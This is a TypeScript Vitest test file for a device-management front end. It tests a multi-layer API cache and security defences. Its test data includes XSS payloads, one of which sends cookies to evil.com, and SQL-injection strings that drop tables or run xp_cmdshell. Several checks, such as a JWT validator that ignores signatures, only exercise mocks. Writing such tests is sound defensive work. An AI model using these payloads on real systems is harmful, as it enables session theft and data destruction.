/**
 * API缓存策略和安全测试
 * 测试API的高级缓存机制和安全防护，包括：
 * - 多层缓存策略（内存、localStorage、sessionStorage）
 * - 缓存失效和刷新机制
 * - 缓存一致性和并发控制
 * - 安全漏洞防护（XSS、CSRF、注入攻击）
 * - 认证和授权安全
 * - 数据传输安全
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { setActivePinia, createPinia } from 'pinia'
import axios from 'axios'
import { deviceApi, authApi } from '/@src/api'
import { useDeviceStore } from '/@src/stores/devices'
import { 
  createDevice, 
  createApiResponse, 
  createErrorResponse,
  createLoginResponse,
  createUser,
  AdvancedApiMocker
} from '/@src/tests/utils/api-test-factory'
import type { Device, ApiResponse } from '/@src/api/types'

// Mock browser APIs for caching tests
const mockLocalStorage = {
  data: new Map<string, string>(),
  getItem: vi.fn((key: string) => mockLocalStorage.data.get(key) || null),
  setItem: vi.fn((key: string, value: string) => mockLocalStorage.data.set(key, value)),
  removeItem: vi.fn((key: string) => mockLocalStorage.data.delete(key)),
  clear: vi.fn(() => mockLocalStorage.data.clear()),
  key: vi.fn((index: number) => Array.from(mockLocalStorage.data.keys())[index] || null),
  get length() { return mockLocalStorage.data.size }
}

const mockSessionStorage = {
  data: new Map<string, string>(),
  getItem: vi.fn((key: string) => mockSessionStorage.data.get(key) || null),
  setItem: vi.fn((key: string, value: string) => mockSessionStorage.data.set(key, value)),
  removeItem: vi.fn((key: string) => mockSessionStorage.data.delete(key)),
  clear: vi.fn(() => mockSessionStorage.data.clear()),
  key: vi.fn((index: number) => Array.from(mockSessionStorage.data.keys())[index] || null),
  get length() { return mockSessionStorage.data.size }
}

Object.defineProperty(window, 'localStorage', { value: mockLocalStorage })
Object.defineProperty(window, 'sessionStorage', { value: mockSessionStorage })

// Advanced Cache Manager for testing
class ApiCacheManager {
  private memoryCache: Map<string, { data: any; timestamp: number; ttl: number }> = new Map()
  private cacheHits: number = 0
  private cacheMisses: number = 0

  set(key: string, data: any, ttl: number = 5 * 60 * 1000) { // 5 minutes default
    const entry = {
      data: JSON.parse(JSON.stringify(data)), // Deep clone
      timestamp: Date.now(),
      ttl
    }

    // Memory cache
    this.memoryCache.set(key, entry)

    // Persistent cache
    try {
      localStorage.setItem(`api_cache_${key}`, JSON.stringify(entry))
    } catch (error) {
      console.warn('Failed to save to localStorage:', error)
    }
  }

  get(key: string): any | null {
    // Try memory cache first
    const memoryEntry = this.memoryCache.get(key)
    if (memoryEntry && this.isValid(memoryEntry)) {
      this.cacheHits++
      return memoryEntry.data
    }

    // Try persistent cache
    try {
      const stored = localStorage.getItem(`api_cache_${key}`)
      if (stored) {
        const entry = JSON.parse(stored)
        if (this.isValid(entry)) {
          // Restore to memory cache
          this.memoryCache.set(key, entry)
          this.cacheHits++
          return entry.data
        } else {
          // Remove expired entry
          this.remove(key)
        }
      }
    } catch (error) {
      console.warn('Failed to read from localStorage:', error)
    }

    this.cacheMisses++
    return null
  }

  remove(key: string) {
    this.memoryCache.delete(key)
    localStorage.removeItem(`api_cache_${key}`)
  }

  clear() {
    this.memoryCache.clear()
    // Clear all API cache entries from localStorage
    const keysToRemove: string[] = []
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i)
      if (key && key.startsWith('api_cache_')) {
        keysToRemove.push(key)
      }
    }
    keysToRemove.forEach(key => localStorage.removeItem(key))
  }

  private isValid(entry: { timestamp: number; ttl: number }): boolean {
    return Date.now() - entry.timestamp < entry.ttl
  }

  getStats() {
    return {
      memoryEntries: this.memoryCache.size,
      persistentEntries: Array.from({ length: localStorage.length }, (_, i) => localStorage.key(i))
        .filter(key => key && key.startsWith('api_cache_')).length,
      cacheHits: this.cacheHits,
      cacheMisses: this.cacheMisses,
      hitRate: this.cacheHits / (this.cacheHits + this.cacheMisses) || 0
    }
  }
}

// Security Test Utilities
class SecurityTestUtils {
  static generateXSSPayloads() {
    return [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<svg onload="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      "'><script>alert('XSS')</script>",
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<div onclick="alert(\'XSS\')">Click me</div>',
      '${alert("XSS")}', // Template injection
      '{{alert("XSS")}}', // Template injection
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>'
    ]
  }

  static generateSQLInjectionPayloads() {
    return [
      "'; DROP TABLE users; --",
      "' OR 1=1 --",
      "' UNION SELECT * FROM users --",
      "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; EXEC xp_cmdshell('dir'); --"
    ]
  }

  static generateCSRFTokens() {
    return [
      '', // Empty token
      'invalid_token',
      'expired_token_' + (Date.now() - 24 * 60 * 60 * 1000), // Expired
      'malformed_token_without_signature',
      'token_with_wrong_signature_' + Math.random().toString(36)
    ]
  }

  static sanitizeInput(input: string): string {
    return input
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;')
  }

  static validateJWT(token: string): boolean {
    if (!token || typeof token !== 'string') return false
    
    const parts = token.split('.')
    if (parts.length !== 3) return false
    
    try {
      const header = JSON.parse(atob(parts[0]))
      const payload = JSON.parse(atob(parts[1]))
      
      // Check expiration
      if (payload.exp && payload.exp < Date.now() / 1000) {
        return false
      }
      
      return true
    } catch {
      return false
    }
  }
}

describe('API缓存策略和安全测试', () => {
  let deviceStore: ReturnType<typeof useDeviceStore>
  let cacheManager: ApiCacheManager
  let apiMocker: AdvancedApiMocker

  beforeEach(() => {
    setActivePinia(createPinia())
    deviceStore = useDeviceStore()
    cacheManager = new ApiCacheManager()
    apiMocker = new AdvancedApiMocker()
    
    // Clear all caches
    cacheManager.clear()
    mockLocalStorage.clear()
    mockSessionStorage.clear()
    
    vi.clearAllMocks()
  })

  afterEach(() => {
    cacheManager.clear()
    vi.clearAllMocks()
  })

  describe('多层缓存策略测试', () => {
    it('应该正确实现内存缓存', async () => {
      const device = createDevice({ id: 1 })
      const cacheKey = 'device_1'
      
      // Cache miss - should return null
      expect(cacheManager.get(cacheKey)).toBeNull()
      
      // Set cache
      cacheManager.set(cacheKey, device, 5000) // 5 second TTL
      
      // Cache hit - should return cached data
      const cachedDevice = cacheManager.get(cacheKey)
      expect(cachedDevice).toEqual(device)
      expect(cachedDevice).not.toBe(device) // Should be a deep clone
      
      const stats = cacheManager.getStats()
      expect(stats.cacheHits).toBe(1)
      expect(stats.cacheMisses).toBe(1)
      expect(stats.memoryEntries).toBe(1)
    })

    it('应该正确处理缓存过期', async () => {
      const device = createDevice({ id: 1 })
      const cacheKey = 'device_1_expire'
      
      // Set cache with very short TTL
      cacheManager.set(cacheKey, device, 10) // 10ms TTL
      
      // Should be available immediately
      expect(cacheManager.get(cacheKey)).toEqual(device)
      
      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 20))
      
      // Should be expired now
      expect(cacheManager.get(cacheKey)).toBeNull()
      
      const stats = cacheManager.getStats()
      expect(stats.cacheMisses).toBe(1) // The expired lookup
    })

    it('应该正确实现持久化缓存回退', async () => {
      const device = createDevice({ id: 1 })
      const cacheKey = 'device_1_persistent'
      
      // Set in cache manager (writes to both memory and localStorage)
      cacheManager.set(cacheKey, device, 60000) // 1 minute TTL
      
      // Clear memory cache only
      cacheManager['memoryCache'].clear()
      
      // Should still get data from localStorage
      const retrievedDevice = cacheManager.get(cacheKey)
      expect(retrievedDevice).toEqual(device)
      
      // Verify it was restored to memory cache
      expect(cacheManager['memoryCache'].has(cacheKey)).toBe(true)
    })

    it('应该处理localStorage存储限制', async () => {
      const largeDevice = createDevice({
        id: 1,
        name: 'x'.repeat(10000), // Large name
        description: 'y'.repeat(50000) // Large description
      })
      
      // Mock localStorage quota exceeded
      const originalSetItem = mockLocalStorage.setItem
      mockLocalStorage.setItem = vi.fn(() => {
        throw new Error('QuotaExceededError')
      })
      
      // Should handle gracefully
      expect(() => {
        cacheManager.set('large_device', largeDevice)
      }).not.toThrow()
      
      // Memory cache should still work
      expect(cacheManager.get('large_device')).toEqual(largeDevice)
      
      // Restore original
      mockLocalStorage.setItem = originalSetItem
    })

    it('应该实现缓存一致性控制', async () => {
      const device1 = createDevice({ id: 1, name: 'Original Device' })
      const device1Updated = createDevice({ id: 1, name: 'Updated Device' })
      const cacheKey = 'device_1'
      
      // Initial cache
      cacheManager.set(cacheKey, device1)
      expect(cacheManager.get(cacheKey).name).toBe('Original Device')
      
      // Update cache
      cacheManager.set(cacheKey, device1Updated)
      expect(cacheManager.get(cacheKey).name).toBe('Updated Device')
      
      // Verify old data is completely replaced
      const cachedDevice = cacheManager.get(cacheKey)
      expect(cachedDevice).toEqual(device1Updated)
      expect(cachedDevice).not.toEqual(device1)
    })
  })

  describe('缓存并发控制测试', () => {
    it('应该处理并发缓存访问', async () => {
      const device = createDevice({ id: 1 })
      const cacheKey = 'concurrent_device'
      
      // Simulate concurrent access
      const promises = Array.from({ length: 10 }, async (_, index) => {
        if (index % 2 === 0) {
          // Even indices: write to cache
          cacheManager.set(`${cacheKey}_${index}`, { ...device, id: index })
        } else {
          // Odd indices: read from cache
          return cacheManager.get(`${cacheKey}_${index - 1}`)
        }
      })
      
      const results = await Promise.all(promises)
      
      // Verify reads returned correct data
      for (let i = 1; i < results.length; i += 2) {
        if (results[i]) {
          expect(results[i].id).toBe(i - 1)
        }
      }
    })

    it('应该防止缓存雪崩', async () => {
      const devices = Array.from({ length: 100 }, (_, i) => createDevice({ id: i + 1 }))
      const shortTTL = 50 // 50ms
      
      // Cache all devices with same short TTL
      devices.forEach((device, index) => {
        cacheManager.set(`avalanche_device_${index}`, device, shortTTL)
      })
      
      // Wait for all to expire around the same time
      await new Promise(resolve => setTimeout(resolve, shortTTL + 10))
      
      // Simulate concurrent access after expiration
      const startTime = performance.now()
      const accessPromises = devices.map((_, index) => 
        Promise.resolve(cacheManager.get(`avalanche_device_${index}`))
      )
      
      const results = await Promise.all(accessPromises)
      const endTime = performance.now()
      
      // All should be cache misses
      expect(results.every(result => result === null)).toBe(true)
      
      // Should complete quickly (no backend overload simulation)
      expect(endTime - startTime).toBeLessThan(100)
    })
  })

  describe('XSS防护测试', () => {
    it('应该防止存储型XSS攻击', async () => {
      const xssPayloads = SecurityTestUtils.generateXSSPayloads()
      
      for (const payload of xssPayloads) {
        const maliciousDevice = createDevice({
          id: 1,
          name: payload,
          description: `Device with ${payload} in description`
        })
        
        // API should sanitize input before storing
        const sanitizedName = SecurityTestUtils.sanitizeInput(payload)
        
        // Verify sanitization worked
        expect(sanitizedName).not.toContain('<script>')
        expect(sanitizedName).not.toContain('javascript:')
        expect(sanitizedName).not.toContain('onerror=')
        expect(sanitizedName).not.toContain('onload=')
        
        // Verify device data doesn't contain active XSS
        expect(maliciousDevice.name).toBe(payload) // Raw data
        
        // In real app, display should use sanitized version
        const displayName = SecurityTestUtils.sanitizeInput(maliciousDevice.name)
        expect(displayName).not.toContain('<script>')
      }
    })

    it('应该防止反射型XSS攻击', async () => {
      const xssPayload = '<script>alert("Reflected XSS")</script>'
      
      // Simulate search with XSS payload
      const searchParams = {
        search: xssPayload,
        page: 1,
        limit: 20
      }
      
      // API should sanitize search parameters
      const sanitizedSearch = SecurityTestUtils.sanitizeInput(searchParams.search)
      
      expect(sanitizedSearch).toBe('&lt;script&gt;alert(&quot;Reflected XSS&quot;)&lt;&#x2F;script&gt;')
      expect(sanitizedSearch).not.toContain('<script>')
    })

    it('应该防止DOM型XSS攻击', async () => {
      // Simulate URL hash injection
      const maliciousHash = '#<script>alert("DOM XSS")</script>'
      
      // In real app, URL parameters should be sanitized before DOM manipulation
      const sanitizedHash = SecurityTestUtils.sanitizeInput(maliciousHash)
      
      expect(sanitizedHash).not.toContain('<script>')
      expect(sanitizedHash).toContain('&lt;script&gt;')
    })
  })

  describe('CSRF防护测试', () => {
    it('应该验证CSRF令牌', async () => {
      const maliciousTokens = SecurityTestUtils.generateCSRFTokens()
      
      for (const token of maliciousTokens) {
        // Mock request with invalid CSRF token
        const mockError = new Error('CSRF token validation failed') as any
        mockError.response = {
          status: 403,
          data: createErrorResponse('CSRF token validation failed', 'CSRF_TOKEN_INVALID', 403)
        }
        
        // Simulate CSRF protection
        if (token === '' || token === 'invalid_token') {
          expect(() => {
            throw mockError
          }).toThrow('CSRF token validation failed')
        }
      }
    })

    it('应该防止跨站请求伪造', async () => {
      // Simulate legitimate request with valid token
      const validToken = 'valid_csrf_token_' + Date.now()
      const deviceUpdateData = {
        name: 'Updated Device Name',
        csrfToken: validToken
      }
      
      // Mock successful request with valid token
      vi.mocked(axios.put).mockResolvedValue({
        data: createApiResponse({ success: true })
      })
      
      const result = await deviceApi.updateDevice(1, deviceUpdateData)
      expect(result.success).toBe(true)
      
      // Simulate forged request without token
      const maliciousUpdateData = {
        name: 'Hacked Device Name'
        // Missing csrfToken
      }
      
      const csrfError = new Error('CSRF token required') as any
      csrfError.response = {
        status: 403,
        data: createErrorResponse('CSRF token required', 'CSRF_TOKEN_MISSING', 403)
      }
      
      vi.mocked(axios.put).mockRejectedValue(csrfError)
      
      await expect(deviceApi.updateDevice(1, maliciousUpdateData)).rejects.toThrow()
    })

    it('应该验证Referer头部', async () => {
      const validReferers = [
        'https://localhost:3000',
        'https://192.168.1.100:8080',
        'https://ezcloud.example.com'
      ]
      
      const invalidReferers = [
        'https://malicious-site.com',
        'http://localhost:3000', // Wrong protocol
        'https://evil.com/attack',
        '', // Empty referer
        null // Missing referer
      ]
      
      // Valid referers should be accepted
      for (const referer of validReferers) {
        const mockRequest = {
          headers: { referer },
          data: { name: 'Test Device' }
        }
        
        // Should pass validation
        expect(referer).toMatch(/^https:\/\/(localhost|192\.168\.\d+\.\d+|[\w.-]+\.example\.com)/);
      }
      
      // Invalid referers should be rejected
      for (const referer of invalidReferers) {
        const refererError = new Error('Invalid referer') as any
        refererError.response = {
          status: 403,
          data: createErrorResponse('Invalid referer', 'INVALID_REFERER', 403)
        }
        
        if (referer && !referer.match(/^https:\/\/(localhost|192\.168\.\d+\.\d+|[\w.-]+\.example\.com)/)) {
          expect(() => {
            throw refererError
          }).toThrow('Invalid referer')
        }
      }
    })
  })

  describe('SQL注入防护测试', () => {
    it('应该防止SQL注入攻击', async () => {
      const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads()
      
      for (const payload of sqlPayloads) {
        // Simulate search with SQL injection payload
        const maliciousQuery = {
          search: payload,
          page: 1,
          limit: 20
        }
        
        // API should use parameterized queries or sanitize input
        const expectedError = new Error('Invalid search query') as any
        expectedError.response = {
          status: 400,
          data: createErrorResponse('Invalid search query', 'INVALID_QUERY', 400, [
            { field: 'search', message: 'Contains invalid characters', code: 'INVALID_CHARACTERS' }
          ])
        }
        
        // Simulate backend validation
        if (payload.includes('--') || payload.includes(';') || payload.includes('DROP')) {
          vi.mocked(axios.get).mockRejectedValue(expectedError)
          
          await expect(deviceApi.getDevices(maliciousQuery)).rejects.toThrow()
        }
      }
    })
  })

  describe('认证和授权安全测试', () => {
    it('应该验证JWT令牌完整性', () => {
      const validTokens = [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjk5OTk5OTk5OTl9.signature',
      ]
      
      const invalidTokens = [
        '', // Empty
        'invalid.token', // Wrong format
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjF9.signature', // Expired
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid_payload.signature', // Invalid payload
        'invalid_header.eyJ1c2VyX2lkIjoxLCJleHAiOjk5OTk5OTk5OTl9.signature' // Invalid header
      ]
      
      validTokens.forEach(token => {
        expect(SecurityTestUtils.validateJWT(token)).toBe(true)
      })
      
      invalidTokens.forEach(token => {
        expect(SecurityTestUtils.validateJWT(token)).toBe(false)
      })
    })

    it('应该正确处理令牌过期', async () => {
      // Mock expired token error
      const tokenExpiredError = new Error('Token expired') as any
      tokenExpiredError.response = {
        status: 401,
        data: createErrorResponse('JWT token has expired', 'TOKEN_EXPIRED', 401)
      }
      
      vi.mocked(axios.get).mockRejectedValue(tokenExpiredError)
      
      await expect(deviceApi.getDevices({})).rejects.toThrow()
      
      // Verify error handling
      try {
        await deviceApi.getDevices({})
      } catch (error: any) {
        expect(error.response?.status).toBe(401)
        expect(error.response?.data.error).toBe('TOKEN_EXPIRED')
      }
    })

    it('应该实现角色权限检查', async () => {
      const adminUser = createUser({ role: 'admin' })
      const regularUser = createUser({ role: 'user' })
      
      // Admin should have access to admin endpoints
      const adminActions = [
        { action: 'delete_device', allowed: true },
        { action: 'manage_users', allowed: true },
        { action: 'system_config', allowed: true }
      ]
      
      // Regular user should have limited access
      const userActions = [
        { action: 'view_own_devices', allowed: true },
        { action: 'update_own_device', allowed: true },
        { action: 'delete_device', allowed: false },
        { action: 'manage_users', allowed: false },
        { action: 'system_config', allowed: false }
      ]
      
      // Test admin permissions
      adminActions.forEach(({ action, allowed }) => {
        const hasPermission = adminUser.role === 'admin' && allowed
        expect(hasPermission).toBe(true)
      })
      
      // Test user permissions
      userActions.forEach(({ action, allowed }) => {
        const hasPermission = (regularUser.role === 'user' && allowed) || regularUser.role === 'admin'
        expect(hasPermission).toBe(allowed)
      })
    })
  })

  describe('数据传输安全测试', () => {
    it('应该强制HTTPS连接', () => {
      const secureUrls = [
        'https://localhost:3000/api/v1/devices',
        'https://192.168.1.100:8080/api/v1/auth/login',
        'https://ezcloud.example.com/api/v1/users'
      ]
      
      const insecureUrls = [
        'http://localhost:3000/api/v1/devices',
        'http://192.168.1.100:8080/api/v1/auth/login',
        'http://ezcloud.example.com/api/v1/users'
      ]
      
      // Secure URLs should be allowed
      secureUrls.forEach(url => {
        expect(url.startsWith('https://')).toBe(true)
      })
      
      // Insecure URLs should be rejected or upgraded
      insecureUrls.forEach(url => {
        expect(url.startsWith('http://')).toBe(true)
        // In production, these should be automatically upgraded to HTTPS
        const secureUrl = url.replace('http://', 'https://')
        expect(secureUrl.startsWith('https://')).toBe(true)
      })
    })

    it('应该验证响应头安全性', () => {
      const securityHeaders = {
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'",
        'X-Frame-Options': 'DENY',
        'X-Content-Type-Options': 'nosniff',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'X-XSS-Protection': '1; mode=block',
        'Referrer-Policy': 'strict-origin-when-cross-origin'
      }
      
      // Verify all critical security headers are present
      Object.entries(securityHeaders).forEach(([header, value]) => {
        expect(value).toBeTruthy()
        expect(typeof value).toBe('string')
        
        // Specific header validations
        switch (header) {
          case 'Content-Security-Policy':
            expect(value).toContain("default-src 'self'")
            break
          case 'X-Frame-Options':
            expect(['DENY', 'SAMEORIGIN'].includes(value)).toBe(true)
            break
          case 'Strict-Transport-Security':
            expect(value).toContain('max-age=')
            break
        }
      })
    })

    it('应该防止敏感数据泄露', () => {
      const user = createUser({
        password: 'sensitive_password_123',
        email: 'user@example.com'
      })
      
      // Create login response (should not include password)
      const loginResponse = createLoginResponse(user)
      
      // Verify password is not included in response
      expect(loginResponse.data.user.password).toBeUndefined()
      
      // Verify only safe fields are included
      const allowedUserFields = ['id', 'username', 'email', 'role', 'is_active', 'created_at', 'updated_at']
      const responseUserFields = Object.keys(loginResponse.data.user)
      
      responseUserFields.forEach(field => {
        expect(allowedUserFields.includes(field)).toBe(true)
      })
    })
  })
})